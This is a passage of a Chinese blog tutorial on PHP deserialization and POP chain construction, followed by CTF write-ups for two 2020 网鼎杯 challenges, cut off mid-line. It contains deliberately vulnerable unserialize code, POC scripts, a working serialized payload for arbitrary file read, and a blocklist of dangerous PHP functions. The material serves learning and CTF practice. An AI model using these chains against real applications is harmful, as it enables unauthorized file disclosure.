-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__toString</span>() <span style=color:#75715e>//把类当作字符串使用时触发
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__invoke</span>() <span style=color:#75715e>//当脚本尝试将对象调用为函数时触发
-</span></span></span></code></pre></div><blockquote><p>审POP链的过程，需要熟练掌握魔术函数。</p></blockquote><ol start=2><li>掌握面向对象概念以及PHP中的类与对象</li></ol><h2 id=序列化与反序列化>序列化与反序列化<a hidden class=anchor aria-hidden=true href=#序列化与反序列化>#</a></h2><blockquote><p><strong>序列化</strong>：把对象转换为字节序列的过程，便于存储或传输。</p><p><strong>反序列化</strong>：把字节序列恢复为对象的过程。</p></blockquote><h3 id=漏洞可能出现的位置>漏洞可能出现的位置<a hidden class=anchor aria-hidden=true href=#漏洞可能出现的位置>#</a></h3><p>1.解析认证token、session的位置</p><p>2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</p><p>3.将对象序列化后在网络中传输，如传输json数据，xml数据等</p><p>4.参数传递给程序</p><p>5.使用RMI协议，被广泛使用的RMI协议完全基于序列化</p><p>6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</p><p>7.定义协议用来接收与发送原始的java对象</p><h3 id=原理>原理<a hidden class=anchor aria-hidden=true href=#原理>#</a></h3><p>在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。</p><h3 id=序列化后的对象字符串>序列化后的对象字符串<a hidden class=anchor aria-hidden=true href=#序列化后的对象字符串>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>7</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;%00A%00name&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>6</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;As1def&#34;</span>;}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。
-</span></span></span><span style=display:flex><span><span style=color:#75715e>// 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
-</span></span></span><span style=display:flex><span><span style=color:#75715e>// s代表string类型
-</span></span></span><span style=display:flex><span><span style=color:#75715e>// 另外还有b=&gt;bool  i=&gt;int  d=&gt;double  a=&gt;array r=&gt;对象引用 R=&gt; 指针引用 N=&gt;NULL;
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。
-</span></span></span></code></pre></div><h2 id=pop链构造>POP链构造<a hidden class=anchor aria-hidden=true href=#pop链构造>#</a></h2><blockquote><p>POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。</p></blockquote><p>即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。</p><h3 id=实例>实例<a hidden class=anchor aria-hidden=true href=#实例>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>//flag is in flag.php
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $var;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>file_get</span>($value)
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        $text <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($value));
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $text;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __invoke(){
-</span></span><span style=display:flex><span>        $content <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file_get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>var</span>);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $content;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $source;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;index.php&#39;</span>)
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;Welcome&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __toString()
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_show</span>()
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hacker&#39;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            <span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>); 
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup()
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hacker&#34;</span>;
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $p;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct()
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __get($key)
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        $function <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $function();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;hello&#39;</span>]))
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;hello&#39;</span>]);
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>(<span style=color:#e6db74>&#39;pop3.php&#39;</span>);
-</span></span><span style=display:flex><span>    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_show</span>();
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h4 id=分析思路>分析思路<a hidden class=anchor aria-hidden=true href=#分析思路>#</a></h4><ul><li>先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（<code>__invoke</code>）时可读取文件。</li><li>可控的是<code>get</code>传入的hello参数，将hello值反序列化，此时会调用<code>__wakeup</code>方法，只有Show类中存在该方法。<code>\_\_wakeup</code>方法中会对<code>$this->source</code>进行正则匹配，此时会将<code>source</code>的内容当作字符串处理，即调用<code>__toString()</code>方法。</li><li><code>__toString</code>方法中读取了<code>$this->str['str']->source</code>，如果<code>str['str']</code>对象中没有<code>source</code>这个变量呢？此时就会调用<code>__get</code>魔术方法（如果该对象存在这个方法的话）。</li><li>观察程序，发现只有Test类有<code>__get</code>方法，用Test类继续构造POP链，会调用<code>$this->p</code>变量，并将<code>$this->p</code>作为函数执行，此时就来到了我们找到的利用点——Read类中的<code>__invoke</code>魔术方法！</li></ul><p>如此，我们构造好了一条POP链：</p><p><code>$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件</code></p><p>得到POC</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $var <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $source;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $str;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $p;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    $read <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Read</span>();
-</span></span><span style=display:flex><span>    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
-</span></span><span style=display:flex><span>    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>=</span>$test; 
-</span></span><span style=display:flex><span>    $test<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span>$read;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($show);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;</span>;
-</span></span><span style=display:flex><span>    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>=</span>$show; <span style=color:#75715e>//这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($show);
-</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><h4 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h4><ol><li>先观察是否存在利用点<ol><li>可执行命令、文件包含的敏感函数</li><li>参数可控的变量、入口</li></ol></li><li>注意所有魔术方法</li><li>将魔术方法执行顺序连成一条链</li><li>确定对象调用顺序，填入对象变量参数，构造POP链</li></ol><h2 id=题目>题目<a hidden class=anchor aria-hidden=true href=#题目>#</a></h2><h3 id=网鼎杯-2020-青龙组areuserialzhttpsbuuojcnchallenges网鼎杯-2020-青龙组areuserialz>[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-青龙组areuserialzhttpsbuuojcnchallenges网鼎杯-2020-青龙组areuserialz>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $op;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $filename;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $content;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __construct() {
-</span></span><span style=display:flex><span>        $op <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
-</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/tmpfile&#34;</span>;
-</span></span><span style=display:flex><span>        $content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello World!&#34;</span>;
-</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>process</span>() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>) {
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>write</span>();
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>) {
-</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>read</span>();
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>($res);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Bad Hacker!&#34;</span>);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>((<span style=color:#a6e22e>string</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>) {
-</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Too long!&#34;</span>);
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>();
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($res) $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Successful!&#34;</span>);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>() {
-</span></span><span style=display:flex><span>        $res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>)) {
-</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $res;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>output</span>($s) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;[Result]: &lt;br&gt;&#34;</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $s;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __destruct() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;2&#34;</span>)
-</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
-</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
-</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>is_valid</span>($s) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($s); $i<span style=color:#f92672>++</span>)
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>(<span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>125</span>))
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET{<span style=color:#e6db74>&#39;str&#39;</span>})) {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    $str <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_GET[<span style=color:#e6db74>&#39;str&#39;</span>];
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_valid</span>($str)) {
-</span></span><span style=display:flex><span>        $obj <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($str);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>观察发现，有反序列化入口，为传入的get参数$str</p><p>会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有<code>\x00*\x00</code>标识，而<code>\x00</code>的ASCII码值为0，不符合条件。</p><h4 id=利用php特性绕过反序列化限制><strong>利用PHP特性绕过反序列化限制</strong><a hidden class=anchor aria-hidden=true href=#利用php特性绕过反序列化限制>#</a></h4><ol><li>PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。</li><li>可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本</li></ol><h4 id=php-弱类型绕过>PHP 弱类型绕过<a hidden class=anchor aria-hidden=true href=#php-弱类型绕过>#</a></h4><p>类中有一个析构函数<code>__destruct</code>，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。</p><p>注意到析构函数中判断使用的是强类型相等<code>===</code>，而<code>process</code>类中的判断时弱类型相等<code>==</code>，可以利用PHP语言特性绕过：<code>"2"==2,2!==="2"</code></p><p>令<code>$op=2</code>而不是<code>"2"</code>即可</p><h4 id=构造poc>构造POC<a hidden class=anchor aria-hidden=true href=#构造poc>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> <span style=color:#a6e22e>FileHandler</span> <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>GlobalFileHandler</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span>{
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $op<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flag.php&#34;</span>;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> $content;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    $fileHandler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FileHandler</span>();
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($fileHandler);
-</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><p>得到</p><p><code>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}</code></p><p>执行查看源代码即得到Flag。</p><h3 id=网鼎杯-2020-朱雀组phpwebhttpsbuuojcnchallenges网鼎杯-2020-朱雀组phpweb>[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-朱雀组phpwebhttpsbuuojcnchallenges网鼎杯-2020-朱雀组phpweb>#</a></h3><p>进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是<code>call_user_func</code>方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。</p><p>直接<code>highlight_file</code>读取本页面源码，得到：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// phpweb poc
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $disable_fun <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#e6db74>&#34;shell_exec&#34;</span>,<span style=color:#e6db74>&#34;system&#34;</span>,<span style=color:#e6db74>&#34;passthru&#34;</span>,<span style=color:#e6db74>&#34;proc_open&#34;</span>,<span style=color:#e6db74>&#34;show_source&#34;</span>,<span style=color:#e6db74>&#34;phpinfo&#34;</span>,<span style=color:#e6db74>&#34;popen&#34;</span>,<span style=color:#e6db74>&#34;dl&#34;</span>,<span style=color:#e6db74>&#34;eval&#34;</span>,<span style=color:#e6db74>&#34;proc_terminate&#34;</span>,<span style=color:#e6db74>&#34;touch&#34;</span>,<span style=color:#e6db74>&#34;escapeshellcmd&#34;</span>,<span style=color:#e6db74>&#34;escapeshellarg&#34;</span>,<span style=color:#e6db74>&#34;assert&#34;</span>,<span style=color:#e6db74>&#34;substr_replace&#34;</span>,<span style=color:#e6db74>&#34;call_user_func_array&#34;</span>,<span style=color:#e6db74>&#34;call_user_func&#34;</span>,<span style=color:#e6db74>&#34;array_filter&#34;</span>, <span style=color:#e6db74>&#34;array_walk&#34;</span>,  <span style=color:#e6db74>&#34;array_map&#34;</span>,<span style=color:#e6db74>&#34;registregister_shutdown_function&#34;</span>,<span style=color:#e6db74>&#34;register_tick_function&#34;</span>,<span 